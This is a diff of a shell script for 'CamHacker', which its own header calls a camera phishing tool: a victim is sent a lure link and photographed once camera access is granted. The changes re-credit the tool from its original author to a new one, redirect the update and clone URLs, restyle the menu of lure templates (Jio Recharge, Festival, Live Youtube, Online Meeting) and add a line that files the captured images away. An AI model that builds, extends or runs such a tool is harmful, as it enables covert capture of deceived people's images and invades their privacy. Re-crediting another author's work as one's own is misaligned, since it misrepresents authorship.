@@ -3,13 +3,10 @@
 # CamHacker
 # Version    : 1.5
 # Description: CamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
-# Author     : KasRoudra
-# Github     : https://github.com/KasRoudra
-# Email      : kasroudrakrd@gmail.com
-# Credits    : Noob-Hackers, TechChipNet, LinuxChoice
-# Date       : 5-09-2021
+# Author     : ZIHAD HOSSAIN RAFI
+# Github     : https://github.com/MR-ZIHAD
 # License    : MIT
-# Copyright  : KasRoudra (2021-2022)
+# Copyright  : MR-ZIHAD (2022-2023)
 # Language   : Shell
 # Portable File
 # If you copy, consider giving credit! We keep our code open source to help others
@@ -17,7 +14,7 @@
 : '
 MIT License
 
-Copyright (c) 2022 KasRoudra
+Copyright (c) 2022 MR-ZIHAD
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
@@ -68,7 +65,6 @@ tunneler_dir="$HOME/.tunneler"
 
 # Logo
 logo="
-
 ${green}  ____                _   _            _
 ${red} / ___|__ _ _ __ ___ | | | | __ _  ___| | _____ _ __
 ${cyan}| |   / _' | '_ ' _ \| |_| |/ _' |/ __| |/ / _ \ '__|
@@ -77,6 +73,7 @@ ${yellow} \____\__,_|_| |_| |_|_| |_|\__,_|\___|_|\_\___|_|
 ${red}                                            [v${version}]
 ${blue}                                    [By MR-ZIHAD]
 "
+
 ngrok_help="
 ${info}Steps: ${nc}
 ${blue}[1]${yellow} Go to ${green}https://ngrok.com
@@ -394,7 +391,8 @@ if [[ -z $UPDATE ]]; then
     exit 1
 else
     if [[ $UPDATE == true ]]; then
-             else
+        git_ver=`curl -s -N https://raw.githubusercontent.com/MR-ZIHAD/CamHacker/main/files/version.txt`
+    else
         git_ver=$version
     fi
 fi
@@ -408,7 +406,7 @@ if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
         read upask
         printf "$nc"
         if [[ "$upask" == "y" ]]; then
-            cd .. && rm -rf CamHacker camhacker && git clone https://github.com/KasRoudra/CamHacker
+            cd .. && rm -rf CamHacker camhacker && git clone https://github.com/MR-ZIHAD/CamHacker
             echo -e "\n${success}CamHacker updated successfully!!"
             if [[ "$changelog" != "404: Not Found" ]]; then
                 echo -e "${purple}[•] Changelog:\n${blue}"
@@ -477,15 +475,15 @@ echo -e "$logo"
 sleep 1
 echo -e "${ask}Choose an option:
 
-${green}[${green}1${green}] ${green}JIO RECHARGE
-${green}[${green}2${green}] ${green}FESTIVAL
-${green}[${green}3${green}] ${green}LIVE YOUTUBE
-${green}[${green}4${green}] ${green}ONLINE MEETING
-${green}[${green}d${green}] ${green}CHANGE IMAGE DIRECTORY (current: ${green}${FOL}${green})
-${green}[${green}p${green}] ${green}CHANGE DEFAULT PORT (current: ${green}${PORT}${green})
-${green}[${green}x${green}] ${green}ABOUT
-${green}[${green}m${green}] ${green}MORE TOOLS
-${green}[${green}0${green}] ${green}EXIT${green}
+${cyan}[${white}1${cyan}] ${yellow}Jio Recharge
+${cyan}[${white}2${cyan}] ${yellow}Festival
+${cyan}[${white}3${cyan}] ${yellow}Live Youtube
+${cyan}[${white}4${cyan}] ${yellow}Online Meeting
+${cyan}[${white}d${cyan}] ${yellow}Change Image Directory (current: ${red}${FOL}${yellow})
+${cyan}[${white}p${cyan}] ${yellow}Change Default Port (current: ${red}${PORT}${yellow})
+${cyan}[${white}x${cyan}] ${yellow}About
+${cyan}[${white}m${cyan}] ${yellow}More tools
+${cyan}[${white}0${cyan}] ${yellow}Exit${blue}
 "
 sleep 1
 if [ -z $OPTION ]; then
@@ -559,7 +557,7 @@ $red[Email]      ${cyan} :[hossainzihad36@gmail.com]"
         printf "$ch_prompt"
         read about
     elif echo $option | grep -q "m"; then
-        xdg-open "https://github.com/MR-ZIHAD#My-Best-Works"
+        xdg-open "https://github.com/MR-ZIHAD/MR-ZIHAD#My-Best-Works"
     elif echo $option | grep -q "0"; then
         echo -e "\n${success}Thanks for using!\n"
         exit 0
@@ -718,6 +716,7 @@ while true; do
     sleep 0.5
     if [[ -e "log.txt" ]]; then
         echo -e "\007${success}Image downloaded! Check directory!\n"
+        file=`ls | grep png`
         mv -f $file $FOL
         rm -rf log.txt
     fi
